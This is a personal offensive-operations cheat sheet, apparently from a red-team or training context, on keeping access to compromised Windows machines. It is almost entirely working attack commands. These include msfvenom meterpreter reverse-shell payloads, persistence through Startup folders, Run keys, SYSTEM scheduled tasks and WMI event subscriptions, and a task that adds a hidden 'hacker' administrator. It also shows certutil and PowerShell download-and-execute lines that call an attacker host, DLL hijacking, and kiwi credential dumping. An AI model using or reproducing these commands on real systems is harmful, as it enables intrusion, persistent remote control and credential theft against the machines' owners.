# Part From the Cyber Bible (Cyber Operations) 
`probably need a script to automate (project idea, create mal, .bat script gen, upload paths,)`
## Create Malware
`change creation date. 1, sticking out 2, in sync with sys files`
`upload to all paths`
* msfvenom --platform windows --arch x86 --format exe --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.2.2 LPORT=443 > winmal.exe
* msfvenom --platform windows --arch x86 --format dll --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.2.2 LPORT=443 > winmal.dll
* https://hackinglethani.com/dll-hijacking-pe/ -> reverse shell with dll > need script to transform hex
* https://abhigowdaa.medium.com/reverse-shell-using-dll-hijacking-vulnerability-8030eb74290

## Listen
* use exploit/multi/handler
* set PAYLOAD windows/meterpreter/reverse_https | tcp
* set ExitOnSession false
* set LHOST LPORT
* exploit -j

# Start up Folder

* (meterprShell) upload winmal.exe "C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winmal.exe"
* * certutil.exe -urlcache -split -f "http://10.99.254.156/msdtl-Service.exe" c:\windows\system32\msdtl.exe
* * c:\windows\system32\msdtl.exe --startup auto install


# Registry 
## Start up Keys

* (meterprShell) upload winmal.exe "C:\\Users\\{USER}\\AppData\\Local\\winmal.exe"
* (meterprShell) reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v AutoStart -d "\"C:\\Users\\{USER}\\AppData\\Local\\winmal.exe\""
* (meterprShell) reg enumkey â€“k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (verify)

## Winlogon Key

## Metasploit

# Scheduled Task
```
SCHTASKS /Create [/S system [/U username [/P [password]]]]
[/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
[/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
[/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
[/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]
```

## user-level 
* (meterprShell) upload winmal.exe "C:\\Users\\{USER}\\AppData\\Local\\winmal.exe"
* (meterprShell) schtasks /create /sc minute /mo 10 /tn "Malware" /tr c:\Users\wmozart\AppData\Local\winmal.exe {/every 10 min}

## system-level
* (meterprShell) schtasks /create /sc minute /mo 10 /tn "SystemMalware" /ru SYSTEM /tr c:\Windows\System32\winmal.exe {/ru as sytem evry 10 min}

## On-idle
* (meterprShell) schtasks /create /sc onidle /i 10 /tn IdleMalware /tr c:\Users\wmozart\AppData\Local\winmal.exe

## Create user
* SCHTASKS /Create /TN "Microsoft\Windows\TextServicesFramework\MsCtfMonitorx86" /SC ONEVENT /EC Security /MO "*[System[(EventID=4625)]]" /RU SYSTEM /TR "net user hacker P@ssw0rd!1 /add && net localgroup Administrators hacker /add"

# Windows Management Instrumentation

* auditpol /get /category:Logon/Logoff (view audit)
* auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
* (Trig fail logon) smbclient \\\\10.0.15.205\\C$ -U bob (random pass)
```
create pesistent db entry every hour (one way) 
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE EventNamespace="root\cimv2", Name="BfeOnServiceStartTypeChange", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.DayOfWeek = 1 OR TargetInstance.DayOfWeek = 2 OR TargetInstance.DayOfWeek = 3 OR TargetInstance.DayOfWeek = 4 OR TargetInstance.DayOfWeek = 5 OR TargetInstance.DayOfWeek = 6 OR TargetInstance.DayOfWeek = 7) AND (TargetInstance.Hour = 8 OR TargetInstance.Hour = 9 OR TargetInstance.Hour = 10 OR TargetInstance.Hour = 11 OR TargetInstance.Hour = 12 OR TargetInstance.Hour = 13 OR TargetInstance.Hour = 14 OR TargetInstance.Hour = 15 OR TargetInstance.Hour = 16) AND TargetInstance.Minute = 40 AND TargetInstance.Second = 0 GROUP WITHIN 60"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WindowsParentalControlsMigration", CommandLineTemplate="<POWERSHELL>"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BfeOnServiceStartTypeChange\"", Consumer="CommandLineEventConsumer.Name=\"WindowsParentalControlsMigration\""
```
* Using metasploit web delivery (one-way) with tools/wmi-persistence.mof
* * use exploit/multi/script/web_delivery
* * info
* * set target 2
* * set payload windows/meterpreter/reverse_tcp 
* * set lhost | lport
* * set uripath bob
* * exploit -j
* * use the ouput in (tools/wmi-persistence.mof) // Checks log every minute for "bob" in logs and execute exploit



## DLL HIJACKING
* (Find point) Procmon.exe > filter > add
* * process name > is > (select target) > add > apply
* * path > contains > dll > add > apply
* * result > contains > name not found >
* with the list of dlls (double click on operation and find the open operation) > good dll to create
* copy payload dll to path
* `msfvenom --platform windows --arch x86 --format dll --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=10.0.2.2 LPORT=443 --template nss3_legit.dll --keep > nss3.dll`
`https://github.com/optiv/ScareCrow`
`https://github.com/mandiant/DueDLLigence`


# Once (power shell)
* powershell -NoProfile -ExecutionPolicy Bypass -Command 'iex ((new-object net.webclient).DownloadString('http://10.99.254.156/update'))'

# Metasploit

## Init DB/ Commands
* msfdb init --> 
* msfconsole -h
* db_status
* help
* search
* use <number>
* show options
* set / setg -> global unset / unsetg -> 
* (module) info
* spool - save
* Auxiliary -> scans if | post
* encoder
* load
* ip a -> see sp addr
* exploit | run -j >as job > `jobs` to see jobs
* sessions -l 
* sessions -i <number>
* help list
* ps > process list
* migrage to spoolcv.exe service > reliable ? can oly migrate to owned proc
* getuid >
* sysinfo
* getprivs
* load kiwi | passwd dumping tool
* run post/windows/gather/checkvm
* run post/multi/recon/local_exploit_suggester check if vm
* Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`
* run autoroute -h > try hop in networks